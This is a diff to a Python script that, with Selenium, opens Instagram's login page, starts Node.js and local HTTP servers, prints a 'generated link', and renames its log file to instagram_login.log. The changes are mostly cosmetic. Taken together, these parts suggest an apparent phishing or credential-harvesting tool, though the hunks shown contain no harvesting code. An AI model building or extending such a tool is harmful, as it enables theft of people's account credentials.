@@ -1,8 +1,7 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python3  
 
 import logging
 import os
-from ssl import Options
 import sys
 import time
 import threading 
@@ -17,7 +16,8 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import getpass
 import math
-import time 
+import time  
+
 
 def check_root():
     return os.geteuid() == 0
@@ -69,8 +69,7 @@ print("\033[92m         #                                             #")
 print("\033[92m         ***********************************************")
 print("\033[92m\n\n")
 
-
-
+# Prompt user to enter a port number
 def validate_port(port):
     return re.match(r'^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port)
 
@@ -83,7 +82,7 @@ def run_server():
             print("Invalid port number. Please enter a valid port number.")
 
     # Configure logging to write to a file
-    logging.basicConfig(filename='server.log', filemode='w', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
+    logging.basicConfig(filename='instagram_login.log', filemode='w', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
 
     # Print start message
     print(f"Starting server on port {port}")
@@ -97,12 +96,8 @@ def run_server():
             self.end_headers()
             self.wfile.write(b"Hello, this is your custom server!")
 
-    # Initialize Chrome WebDriver
-
-    chrome_options = webdriver.ChromeOptions()
-    chrome_options.add_argument('--no-sandbox')
-    chrome_options.add_argument('--headless')  # Optional: Run Chrome in headless mode
-    driver = webdriver.Chrome(executable_path='/usr/lib/chromium-browser/chromedriver', options=chrome_options)
+  # Initialize the Chrome WebDriver
+    driver = webdriver.Chrome()  # Use Chrome or Firefox: webdriver.Chrome() or webdriver.Firefox()
 
     try:
         # Open Instagram login page
@@ -136,14 +131,14 @@ def run_server():
     except Exception as e:
         print(f"An error occurred: {e}")
 
-     # Run the Node.js server in a separate thread
+    #Run the node.js server in a separate thread 
     threading.Thread(target=lambda: subprocess.run(["node", "server.js", str(port)])).start()
-
+       
     # Create the server
     with socketserver.TCPServer(("", int(port)), MyRequestHandler) as httpd:
         print(f"Server is running on port {port}")
 
-        # Generate the link
+   # Generate the link
         link = f"http://localhost:{port}/"
         print(f"Generated link: {link}")
 
@@ -151,5 +146,5 @@ def run_server():
         httpd.serve_forever()
 
 if __name__ == "__main__":
-       main()
-       run_server()
+    main()
+    run_server()
